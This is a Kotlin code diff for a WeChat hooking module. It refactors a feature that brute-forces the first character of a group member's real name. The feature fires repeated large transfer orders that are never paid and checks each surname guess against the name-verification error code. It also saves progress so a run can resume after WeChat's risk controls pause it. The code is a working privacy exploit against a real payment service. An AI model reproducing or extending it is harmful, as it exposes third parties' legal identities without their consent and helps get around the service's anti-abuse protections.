@@ -1,11 +1,13 @@
 package dev.ujhhgtg.wekit.features.items.chat
 
 import android.app.Activity
+import androidx.annotation.StringRes
 import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.text.KeyboardOptions
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material3.LinearWavyProgressIndicator
 import androidx.compose.material3.Text
+import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.TextField
 import androidx.compose.runtime.Composable
 import androidx.compose.runtime.LaunchedEffect
@@ -14,15 +16,22 @@ import androidx.compose.runtime.getValue
 import androidx.compose.runtime.mutableIntStateOf
 import androidx.compose.runtime.mutableStateOf
 import androidx.compose.runtime.remember
+import androidx.compose.runtime.rememberCoroutineScope
 import androidx.compose.runtime.setValue
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.res.stringResource
+import androidx.compose.ui.res.pluralStringResource
 import androidx.compose.ui.text.input.KeyboardType
+import dev.ujhhgtg.wekit.R
+import dev.ujhhgtg.wekit.data.WeKitDatabase
+import dev.ujhhgtg.wekit.data.entity.RealNameScanProgressEntity
+import dev.ujhhgtg.wekit.data.JsonDataMigration
 import dev.ujhhgtg.wekit.features.api.core.WeDatabaseApi
 import dev.ujhhgtg.wekit.features.api.net.WeTransferApi
 import dev.ujhhgtg.wekit.features.api.net.WeTransferApi.fetchBeforeTransfer
 import dev.ujhhgtg.wekit.features.api.net.WeTransferApi.sendPlaceOrder
 import dev.ujhhgtg.wekit.features.api.ui.WeContactPrefsScreenApi
-import dev.ujhhgtg.wekit.features.core.Feature
+import dev.ujhhgtg.wekit.features.core.FeatureCategoryIds
 import dev.ujhhgtg.wekit.features.core.SwitchFeature
 import dev.ujhhgtg.wekit.ui.content.AlertDialogContent
 import dev.ujhhgtg.wekit.ui.content.Button
@@ -32,104 +41,63 @@ import dev.ujhhgtg.wekit.ui.utils.ShowComposeDialogScope
 import dev.ujhhgtg.wekit.ui.utils.showComposeDialog
 import dev.ujhhgtg.wekit.utils.WeLogger
 import dev.ujhhgtg.wekit.utils.android.currentWxId
-import dev.ujhhgtg.wekit.utils.fs.KnownPaths
 import dev.ujhhgtg.wekit.utils.strings.isGroupChatWxId
-import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.CancellationException
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.runBlocking
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import kotlinx.serialization.ExperimentalSerializationApi
-import kotlinx.serialization.json.Json
+import kotlinx.coroutines.withContext
 import java.util.concurrent.ConcurrentHashMap
-import kotlin.io.path.div
-import kotlin.io.path.exists
-import kotlin.io.path.readText
-import kotlin.io.path.writeText
 import kotlin.time.Duration.Companion.seconds
 
-@OptIn(ExperimentalSerializationApi::class)
-@Feature(
-    name = "爆破群成员实名首字",
-    categories = ["聊天", "联系人详情页面"],
-    description = "通过大额转账的姓名校验接口, 逐一尝试并还原群成员实名的首字 (与显示实名尾字功能配合可拼出完整姓名). 会向服务器发起多次转账下单 (不会真正扣款), 有触发风控的风险, 请自行承担"
-)
 object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
     WeContactPrefsScreenApi.IContactInfoProvider {
 
+    override val technicalId = "爆破群成员实名首字"
+    override val nameRes = R.string.feature_brute_force_group_member_real_names_first_char_name
+    override val categoryIds = listOf(FeatureCategoryIds.CHAT, FeatureCategoryIds.CONTACT_DETAILS)
+    override val descriptionRes = R.string.feature_brute_force_group_member_real_names_first_char_description
+
     private const val TAG = "BruteForceGroupMemberRealNamesFirstChar"
-    private const val PREF_KEY = "exploit_real_name_first_char"
 
     /** WeChat's retcode for "姓名验证不正确" — i.e. the guessed [Char] was wrong. */
     private const val RETCODE_WRONG_NAME = "268502266"
 
-
     // ── Result cache ──────────────────────────────────────────────────────────
-
-    private val cacheFile by lazy { KnownPaths.moduleData / "real_names_first_char.json" }
 
     /**
      * wxId → confirmed real-name first char. Only hits are stored.
      * Exposed so [DisplayGroupMemberRealName] can read it for combined display.
      */
     val realNames = ConcurrentHashMap<String, String>()
-
-    private fun loadCache() {
-        runCatching {
-            val file = cacheFile
-            if (!file.exists()) return
-            val map = Json.decodeFromString<Map<String, String>>(file.readText())
-            realNames.putAll(map)
-            WeLogger.d(TAG, "loaded ${map.size} cached first chars")
-        }.onFailure { WeLogger.w(TAG, "failed to load $cacheFile", it) }
-    }
-
-    private fun saveCache() {
-        runCatching {
-            cacheFile.writeText(Json.encodeToString(realNames.toMap()))
-        }.onFailure { WeLogger.w(TAG, "failed to save $cacheFile", it) }
-    }
-
-    // ── Progress persistence (pause / resume) ─────────────────────────────────
-
-    /**
-     * Persists the index into [COMMON_SURNAMES] at which the next attempt should resume after
-     * a rate-limit pause. Format: `Map<wxId, resumeIndex>`.
-     *
-     * Entries are written when a rate-limit retcode is encountered, and cleared on a confirmed
-     * hit, manual cancellation, or loop exhaustion so stale progress never blocks a fresh run.
-     */
-    private val progressFile by lazy { KnownPaths.moduleData / "real_names_first_char_progress.json" }
     private val savedProgress = ConcurrentHashMap<String, Int>()
 
-    private fun loadProgress() {
-        runCatching {
-            if (!progressFile.exists()) return
-            val map = Json.decodeFromString<Map<String, Int>>(progressFile.readText())
-            savedProgress.putAll(map)
-            WeLogger.d(TAG, "loaded progress for ${map.size} members")
-        }.onFailure { WeLogger.w(TAG, "failed to load $progressFile", it) }
+    private suspend fun saveProgress(memberId: String, resumeIndex: Int) = withContext(Dispatchers.IO) {
+        WeKitDatabase.instance.simpleStructuredDao()
+            .putScanProgress(RealNameScanProgressEntity(memberId, resumeIndex))
+        savedProgress[memberId] = resumeIndex
     }
 
-    private fun saveProgress(memberId: String, resumeIndex: Int) {
-        runCatching {
-            savedProgress[memberId] = resumeIndex
-            progressFile.writeText(Json.encodeToString(savedProgress.toMap()))
-        }.onFailure { WeLogger.w(TAG, "failed to save progress for $memberId", it) }
-    }
-
-    private fun clearProgress(memberId: String) {
-        if (savedProgress.remove(memberId) != null) {
-            runCatching {
-                progressFile.writeText(Json.encodeToString(savedProgress.toMap()))
-            }.onFailure { WeLogger.w(TAG, "failed to clear progress for $memberId", it) }
-        }
+    private suspend fun clearProgress(memberId: String) = withContext(Dispatchers.IO) {
+        WeKitDatabase.instance.simpleStructuredDao().removeScanProgress(memberId)
+        savedProgress.remove(memberId)
     }
 
     // ── Lifecycle ─────────────────────────────────────────────────────────────
 
     override fun onEnable() {
-        loadCache()
-        loadProgress()
+        runBlocking(Dispatchers.IO) {
+            JsonDataMigration.requireCompleted("chat", "real_names_first_char")
+            JsonDataMigration.requireCompleted("chat", "real_names_first_char_progress")
+            val dao = WeKitDatabase.instance.simpleStructuredDao()
+            val names = dao.getRealNameParts("FIRST")
+            val progress = dao.getScanProgress()
+            realNames.clear()
+            realNames.putAll(names.associate { it.wxId to it.value })
+            savedProgress.clear()
+            savedProgress.putAll(progress.associate { it.wxId to it.resumeIndex })
+        }
         WeContactPrefsScreenApi.addProvider(this)
     }
 
@@ -145,26 +113,23 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
 
         return listOf(
             WeContactPrefsScreenApi.PreferenceItem(
-                key = PREF_KEY,
-                title = "爆破群成员实名首字",
-                summary = realNames[memberId]?.let { "首字: $it" } ?: "点击爆破",
-                position = 1
+                title = localizedChatString(R.string.chat_real_name_bruteforce_title),
+                summary = realNames[memberId]?.let {
+                    localizedChatString(R.string.chat_real_name_bruteforce_first_char, it)
+                } ?: localizedChatString(R.string.chat_real_name_bruteforce_tap),
+                position = 1,
+                onClick = onClick@{ activity ->
+                    val clickedMemberId = activity.currentWxId ?: return@onClick
+                    // Non-null only when the profile was opened from inside a group chat.
+                    // Null means a direct friend lookup — beforetransfer and transferplaceorder
+                    // both handle this case with groupId omitted.
+                    val groupId = activity.intent.getStringExtra("Contact_ChatRoomId")
+                        ?.takeIf { it.isNotEmpty() }
+
+                    showComposeDialog(activity) { ExploitDialog(clickedMemberId, groupId) }
+                },
             )
         )
-    }
-
-    override fun onItemClick(activity: Activity, key: String): Boolean {
-        if (key != PREF_KEY) return false
-
-        val memberId = activity.currentWxId ?: return true
-        // Non-null only when the profile was opened from inside a group chat.
-        // Null means a direct friend lookup — beforetransfer and transferplaceorder
-        // both handle this case with groupId omitted.
-        val groupId = activity.intent.getStringExtra("Contact_ChatRoomId")
-            ?.takeIf { it.isNotEmpty() }
-
-        showComposeDialog(activity) { ExploitDialog(memberId, groupId) }
-        return true
     }
 
     // ── Brute-force orchestration ─────────────────────────────────────────────
@@ -175,7 +140,7 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
 
         /** Server said no name check is required for this transfer — nothing to brute-force. */
         data object NoCheckNeeded : RunResult
-        data class Failed(val reason: String) : RunResult
+        data class Failed(@StringRes val reasonRes: Int, val formatArgs: List<Any> = emptyList()) : RunResult
 
         /** User aborted mid-run; carries how far we got. */
         data class Aborted(val tried: Int) : RunResult
@@ -210,10 +175,11 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
         state: RunState
     ): RunResult {
         val before = fetchBeforeTransfer(memberId, groupId)
-            ?: return RunResult.Failed("beforetransfer 失败 (可能被删除/拉黑/账号异常)")
+            ?: return RunResult.Failed(R.string.chat_real_name_bruteforce_error_before_transfer)
         val maskedRealName = before.maskedRealName
-            ?: return RunResult.Failed("CGI 未返回实名尾字")
-        val key = before.key ?: return RunResult.Failed("CGI 未返回 truename_extend 密钥")
+            ?: return RunResult.Failed(R.string.chat_real_name_bruteforce_error_missing_suffix)
+        val key = before.key
+            ?: return RunResult.Failed(R.string.chat_real_name_bruteforce_error_missing_key)
 
         val contact = WeDatabaseApi.getFriend(memberId)
         val nickname = contact?.let { it.remarkName.ifEmpty { it.nickname } } ?: memberId
@@ -230,7 +196,7 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
 
         // Probe: no input_name / checkname_sign → server returns the namemessage challenge.
         val probe = sendPlaceOrder(ctx, inputName = null, checknameSign = null)
-            ?: return RunResult.Failed("下单探测请求超时")
+            ?: return RunResult.Failed(R.string.chat_real_name_bruteforce_error_probe_timeout)
 
         WeLogger.i(TAG, "probe response: $probe")
 
@@ -241,11 +207,11 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
         }
 
         val nameMessage = probe.optJSONObject("namemessage")
-            ?: return RunResult.Failed("响应缺少 namemessage")
+            ?: return RunResult.Failed(R.string.chat_real_name_bruteforce_error_missing_name_message)
         val checknameSign = nameMessage.optString("checkname_sign")
         val displayName = nameMessage.optString("display_name")
         if (checknameSign.isNullOrEmpty()) {
-            return RunResult.Failed("响应缺少 checkname_sign")
+            return RunResult.Failed(R.string.chat_real_name_bruteforce_error_missing_signature)
         }
         WeLogger.i(TAG, "challenge: display_name='$displayName', sign=$checknameSign (startIndex=${state.startIndex})")
 
@@ -275,9 +241,12 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
                 }
 
                 retcode.isNullOrEmpty() || retcode == "0" -> {
-                    realNames[memberId] = candidate
-                    saveCache()
-                    clearProgress(memberId)
+                    withContext(Dispatchers.IO) {
+                        WeKitDatabase.instance.simpleStructuredDao()
+                            .recordFirstNameAndClearProgress(memberId, candidate)
+                        realNames[memberId] = candidate
+                        savedProgress.remove(memberId)
+                    }
                     return RunResult.Found(candidate, displayName)
                 }
 
@@ -292,7 +261,10 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
         }
 
         clearProgress(memberId)
-        return RunResult.Failed("已尝试全部 ${COMMON_SURNAMES.size} 个常见姓氏, 未命中")
+        return RunResult.Failed(
+            R.string.chat_real_name_bruteforce_error_exhausted,
+            listOf(COMMON_SURNAMES.size),
+        )
     }
 
     // ── Dialog ────────────────────────────────────────────────────────────────
@@ -310,6 +282,9 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
     ) {
         var phase by remember { mutableStateOf<Phase>(Phase.Idle) }
         var amountInput by remember { mutableStateOf("100000") }
+        var restarting by remember { mutableStateOf(false) }
+        var saveFailed by remember { mutableStateOf(false) }
+        val scope = rememberCoroutineScope()
 
         // Read saved progress once at composition time; stable for the dialog lifetime
         val resumeIndex = remember { savedProgress[memberId] }
@@ -321,38 +296,59 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
             val current = phase
             if (current is Phase.Running) {
                 dialog.setCancelable(false)
-                CoroutineScope(Dispatchers.IO).launch {
-                    val amount = amountInput.toDoubleOrNull()?.takeIf { it > 0 } ?: 100000.0
-                    val result = runBruteForce(memberId, groupId, amount, current.state)
-                    if (phase is Phase.Running) {
-                        phase = Phase.Done(result)
-                        dialog.setCancelable(true)
+                val amount = amountInput.toDoubleOrNull()?.takeIf { it > 0 } ?: 100000.0
+                val result = try {
+                    withContext(Dispatchers.IO) {
+                        runBruteForce(memberId, groupId, amount, current.state)
                     }
+                } catch (e: CancellationException) {
+                    throw e
+                } catch (e: Exception) {
+                    WeLogger.e(TAG, "real-name operation failed before its result could be committed", e)
+                    RunResult.Failed(R.string.structured_storage_save_failed)
                 }
+                phase = Phase.Done(result)
+                dialog.setCancelable(true)
             }
         }
 
         AlertDialogContent(
-            title = { Text(if (phase is Phase.Idle) "警告" else "爆破群成员实名首字") },
+            title = {
+                Text(
+                    if (phase is Phase.Idle) {
+                        stringResource(R.string.chat_real_name_bruteforce_warning)
+                    } else {
+                        stringResource(R.string.chat_real_name_bruteforce_title)
+                    },
+                )
+            },
             text = {
                 DefaultColumn(Modifier.verticalScroll(rememberScrollState())) {
+                    if (restarting) {
+                        LinearWavyProgressIndicator()
+                        Text(stringResource(R.string.structured_storage_saving))
+                    }
+                    if (saveFailed) {
+                        Text(stringResource(R.string.structured_storage_save_failed), color = MaterialTheme.colorScheme.error)
+                    }
                     when (val current = phase) {
                         is Phase.Idle -> {
-                            Text(
-                                "此功能会以设定金额向该成员发起多次转账下单请求 (仅下单, 不会真正扣款), " +
-                                        "逐一尝试实名首字. 可能触发微信风控, 风险自负.\n\n" +
-                                        "金额需足够大以触发姓名校验 (默认 10 万元). 与「显示群成员实名尾字」配合可拼出姓名."
-                            )
+                            Text(stringResource(R.string.chat_real_name_bruteforce_warning_message))
                             if (resumeIndex != null) {
                                 Text(
-                                    "检测到上次因风控暂停的进度 (已尝试 ${COMMON_SURNAMES.size - remaining}/${COMMON_SURNAMES.size}, " +
-                                            "将从「${COMMON_SURNAMES[resumeIndex]}」继续). 点击「继续」恢复上次进度, 或点击「重新开始」从头开始."
+                                    stringResource(
+                                        R.string.chat_real_name_bruteforce_resume_message,
+                                        COMMON_SURNAMES.size - remaining,
+                                        COMMON_SURNAMES.size,
+                                        COMMON_SURNAMES[resumeIndex],
+                                    ),
                                 )
                             }
                             TextField(
                                 value = amountInput,
+                                enabled = !restarting,
                                 onValueChange = { amountInput = it.filter { c -> c.isDigit() }.take(7) },
-                                label = { Text("转账金额 (元)") },
+                                label = { Text(stringResource(R.string.chat_real_name_bruteforce_amount)) },
                                 keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                                 singleLine = true
                             )
@@ -361,27 +357,42 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
                         is Phase.Running -> {
                             val tried by current.state.tried
                             val total = current.state.total
-                            Text("正在尝试, 请稍等...\n已尝试: $tried/$total")
+                            Text(stringResource(R.string.chat_real_name_bruteforce_running, tried, total))
                             LinearWavyProgressIndicator(progress = { if (total == 0) 0f else tried.toFloat() / total })
                         }
 
                         is Phase.Done -> when (val r = current.result) {
                             is RunResult.Found ->
-                                Text("命中! 实名首字为「${r.char}」\n\n校验掩码: ?${r.displayName}")
+                                Text(
+                                    stringResource(
+                                        R.string.chat_real_name_bruteforce_found,
+                                        r.char,
+                                        r.displayName,
+                                    ),
+                                )
 
                             RunResult.NoCheckNeeded ->
-                                Text("该成员无需姓名校验即可转账 (无法通过此方式获取首字)")
+                                Text(stringResource(R.string.chat_real_name_bruteforce_no_check))
 
                             is RunResult.Failed ->
-                                Text("失败: ${r.reason}")
+                                Text(
+                                    stringResource(
+                                        R.string.chat_real_name_bruteforce_failed,
+                                        stringResource(r.reasonRes, *r.formatArgs.toTypedArray()),
+                                    ),
+                                )
 
                             is RunResult.Aborted ->
-                                Text("已终止 (尝试了 ${r.tried} 个)")
+                                Text(pluralStringResource(R.plurals.chat_real_name_bruteforce_aborted, r.tried, r.tried))
 
                             is RunResult.Paused ->
                                 Text(
-                                    "已暂停 (触发风控, 尝试了 ${r.tried} 个). " +
-                                            "进度已保存, 下次打开将从「${COMMON_SURNAMES[r.resumeIndex]}」继续."
+                                    pluralStringResource(
+                                        R.plurals.chat_real_name_bruteforce_paused,
+                                        r.tried,
+                                        r.tried,
+                                        COMMON_SURNAMES[r.resumeIndex],
+                                    ),
                                 )
                         }
                     }
@@ -392,21 +403,29 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
                     is Phase.Idle -> {
                         if (resumeIndex != null) {
                             // Two buttons when there is saved progress: resume (primary) and restart
-                            Button(onClick = {
+                            Button(enabled = !restarting, onClick = {
                                 phase = Phase.Running(
                                     RunState(mutableIntStateOf(0), remaining, startIndex = resumeIndex)
                                 )
-                            }) { Text("继续 (${COMMON_SURNAMES.size - remaining + 1}/${COMMON_SURNAMES.size})") }
+                            }) {
+                                Text(
+                                    stringResource(
+                                        R.string.chat_real_name_bruteforce_continue_progress,
+                                        COMMON_SURNAMES.size - remaining + 1,
+                                        COMMON_SURNAMES.size,
+                                    ),
+                                )
+                            }
                         } else {
-                            Button(onClick = {
+                            Button(enabled = !restarting, onClick = {
                                 phase = Phase.Running(
                                     RunState(mutableIntStateOf(0), COMMON_SURNAMES.size)
                                 )
-                            }) { Text("开始") }
+                            }) { Text(stringResource(R.string.chat_real_name_bruteforce_start)) }
                         }
                     }
 
-                    is Phase.Done -> Button(onDismiss) { Text("关闭") }
+                    is Phase.Done -> Button(onDismiss) { Text(stringResource(R.string.dialog_close)) }
                     else -> {}
                 }
             },
@@ -415,18 +434,35 @@ object BruteForceGroupMemberRealNamesFirstChar : SwitchFeature(),
                     is Phase.Idle -> {
                         if (resumeIndex != null) {
                             // "重新开始" clears saved progress and runs from index 0
-                            TextButton(onClick = {
-                                clearProgress(memberId)
-                                phase = Phase.Running(
-                                    RunState(mutableIntStateOf(0), COMMON_SURNAMES.size)
-                                )
-                            }) { Text("重新开始") }
+                            TextButton(enabled = !restarting, onClick = {
+                                restarting = true
+                                saveFailed = false
+                                dialog.setCancelable(false)
+                                scope.launch {
+                                    try {
+                                        clearProgress(memberId)
+                                        phase = Phase.Running(
+                                            RunState(mutableIntStateOf(0), COMMON_SURNAMES.size)
+                                        )
+                                    } catch (e: CancellationException) {
+                                        throw e
+                                    } catch (e: Exception) {
+                                        WeLogger.e(TAG, "failed to clear real-name scan progress", e)
+                                        saveFailed = true
+                                        dialog.setCancelable(true)
+                                    } finally {
+                                        restarting = false
+                                    }
+                                }
+                            }) { Text(stringResource(R.string.chat_real_name_bruteforce_restart)) }
                         } else {
-                            TextButton(onDismiss) { Text("取消") }
+                            TextButton(onDismiss) { Text(stringResource(R.string.dialog_cancel)) }
                         }
                     }
 
-                    is Phase.Running -> TextButton(onClick = { current.state.cancelled = true }) { Text("终止") }
+                    is Phase.Running -> TextButton(onClick = { current.state.cancelled = true }) {
+                        Text(stringResource(R.string.chat_real_name_bruteforce_abort))
+                    }
                     is Phase.Done -> {}
                 }
             }
